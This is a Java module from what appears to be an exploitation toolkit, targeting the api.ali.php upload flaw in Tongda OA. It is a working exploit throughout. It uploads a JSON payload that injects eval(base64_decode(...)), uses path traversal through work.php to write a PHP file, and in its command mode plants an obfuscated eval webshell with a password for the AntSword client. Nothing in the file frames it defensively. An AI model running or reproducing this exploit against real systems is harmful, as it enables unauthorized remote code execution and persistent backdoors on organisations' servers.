package exp.oa.tongdaoa;

import com.github.kevinsawicki.http.HttpRequest;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.Base64Utils;
import utils.HttpTools;
import utils.Response;

import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.Date;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class tongda_apiali_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }


    //  获取当前年月格式为yyMM
    public static String getYearMonth(){
        LocalDate now = LocalDate.now();
        DateTimeFormatter yearFormat = DateTimeFormatter.ofPattern("yy");
        DateTimeFormatter monthFormat = DateTimeFormatter.ofPattern("MM");
        return now.format(yearFormat)+now.format(monthFormat);
    }

    public static String apialiupload(String url,String filename , String shell){
        try {
            String path = "/mobile/api/api.ali.php";
            //定义请求body内容

            String var1 = "file_put_contents('../../" + filename + ".php','" + shell + "');";
            String webshell = "{\"modular\":\"AllVariable\",\"a\":\"" + Base64Utils.base64Encode(var1) + "\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}";

            //发起请求写入json文件
            HashMap head = new HashMap();
            head.put("Content-Type", "multipart/form-data; boundary=00content0boundary00");
            String varData1 = "--00content0boundary00\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + ".json\"\r\n" +
                    "\r\n" +
                    webshell +
                    "\r\n" +
                    "--00content0boundary00--";
            Response request = HttpTools.post(url + path, varData1, head, "utf-8");
            if (request.getCode() == 200) {
                //定义写入文件请求path路径
                String path2 = "/inc/package/work.php?id=../../../../../myoa/attach/approve_center/" + getYearMonth() + "/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E." + filename;
                //发起请求写入文件
                Response getWrite = HttpTools.get(url + path2, new HashMap<>(), "utf-8");

                if (getWrite.getText().contains("OK") && HttpTools.get(url + "/" + filename + ".php", new HashMap<>(), "utf-8").getCode()==200) {
                    return url + "/" + filename + ".php";
                }
            }
        }catch (Exception E){
            return null;
        }
        return null;
    }

    private boolean att(String url,TextArea textArea){
        long tt = (new Date()).getTime();
        String filename= tt+"";
        String shell = "<?php echo "+tt+";?>";
        String fullpath = apialiupload(url,filename,shell);
        if(fullpath != null){
            Platform.runLater(() -> {
                textArea.appendText("\n [ tongda_apiali_upload ]");
                textArea.appendText("\n 文件写入成功: " + fullpath + "\n " +
                        "访问成功: " + HttpTools.get(fullpath, new HashMap<>(), "utf-8").getText());
                textArea.appendText("\n CMD处设置密码，默认蚁剑");
                textArea.appendText("\n ");
            });
            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n ");
            });
            return false;
        }
    }

    //EXP
    private boolean attcmd(String url, String pass, TextArea textArea, TextArea textArea_cmd){
        long tt = (new Date()).getTime();
        String filename = "R4g" + tt ;
        String shell = "<?php echo "+filename+";?><?php class Gz5SfY10 { public function __construct($H7Es8){ @eval(\"/*Z7y11Eib8N*/\".$H7Es8.\"\"); }}new Gz5SfY10($_REQUEST[\"" + pass + "\"]);?>";
        String path = apialiupload(url, filename, shell);
        if (path != null) {

            Platform.runLater(() -> {
                textArea.appendText("\n webshell访问成功");
                textArea_cmd.appendText("\n " + path);
                textArea_cmd.appendText("\n 蚁剑密码: " + pass);
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell访问失败");
            });
            return false;
        }
    }
}
